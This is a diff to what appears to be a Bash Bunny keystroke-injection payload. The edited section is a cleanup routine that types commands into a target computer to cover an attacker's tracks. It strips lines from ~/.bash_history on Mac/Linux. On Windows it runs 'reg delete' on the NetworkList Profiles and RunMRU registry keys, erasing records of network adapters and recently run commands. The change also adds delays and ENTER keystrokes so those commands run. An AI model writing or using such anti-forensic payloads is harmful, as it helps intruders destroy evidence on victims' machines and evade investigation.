@@ -36,15 +36,12 @@ QUACK BACKSPACE
 QUACK DELAY 100
 QUACK STRING $PLATFORM_COMMAND
 QUACK ENTER
-QUACK DELAY 2000
+QUACK DELAY 1000
 
 # PLATFORM COMMANDS
 if [ $PLATFORM_COMMAND == "terminal" ]; then
 # MAC / LINUX
     #++ INSERT CUSTOM MAC / LINUX CLEANUP GOODNESS ++
-
-    # todo Remove extra ethernet connections
-
 
     if [ $LINES > 0 ]; then
         QUACK STRING head -n -$LINES ~/.bash_history
@@ -61,16 +58,21 @@ else
     # QUACK STRING netsh show profiles
     # QUACK ENTER
     # QUACK DELAY 100
+    # todo ADAPTER = Get last ethernet adapter
     # QUACK ENTER
-    # QUACK STRING netsh delete profile interface= InterfaceName
+    # QUACK STRING netsh delete profile interface= $ADAPTER
     # QUACK ENTER
+    # QUACK DELAY 100
 
     # REMOVE ALL ETHERNET ADAPTERS
     QUACK STRING reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles /va /f
-
+    QUACK ENTER
+    QUACK DELAY 100
     QUACK STRING reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+    QUACK ENTER
 fi
 
+QUACK DELAY 100
 QUACK STRING exit
 QUACK ENTER
 
